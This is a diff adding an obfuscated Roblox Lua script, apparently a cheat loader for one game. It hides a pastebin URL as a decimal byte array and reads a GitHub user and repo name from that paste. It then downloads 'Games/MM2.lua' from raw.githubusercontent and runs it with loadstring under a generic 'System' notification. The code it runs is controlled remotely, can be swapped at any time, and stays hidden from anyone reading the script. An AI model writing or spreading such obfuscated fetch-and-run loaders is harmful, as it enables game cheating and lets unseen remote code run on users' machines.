@@ -1,0 +1,54 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local _0x1 = {104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,88,90,88,76,65,101,115,54}
+local _0x2 = game.PlaceId
+
+local _0x3 = {
+    [142823291] = "MM2.lua"
+}
+
+local function _0x4(_0x5)
+    local _0x6 = ""
+    for _0x7 = 1, #_0x5 do
+        _0x6 = _0x6 .. string.char(_0x5[_0x7])
+    end
+    return _0x6
+end
+
+local function _0x8(_0x9)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "System",
+            Text = _0x9,
+            Duration = 3
+        })
+    end)
+end
+
+local function _0x10()
+    local _0x11 = _0x3[_0x2]
+    if not _0x11 then return end
+
+    local _0x12 = _0x4(_0x1)
+    local _0x13, _0x14 = pcall(game.HttpGet, game, _0x12)
+    
+    if not _0x13 then return end
+
+    local _0x15 = string.split(_0x14, "\n")
+    local _0x16 = string.gsub(_0x15[1], "%s+", "")
+    local _0x17 = string.gsub(_0x15[2], "%s+", "")
+
+    local _0x18 = "https://raw.githubusercontent.com/" .. _0x16 .. "/" .. _0x17 .. "/main/Games/" .. _0x11
+    local _0x19, _0x20 = pcall(game.HttpGet, game, _0x18)
+
+    if _0x19 then
+        local _0x21, _0x22 = loadstring(_0x20)
+        if _0x21 then
+            _0x8("Success")
+            _0x21()
+        end
+    end
+end
+
+task.spawn(_0x10)
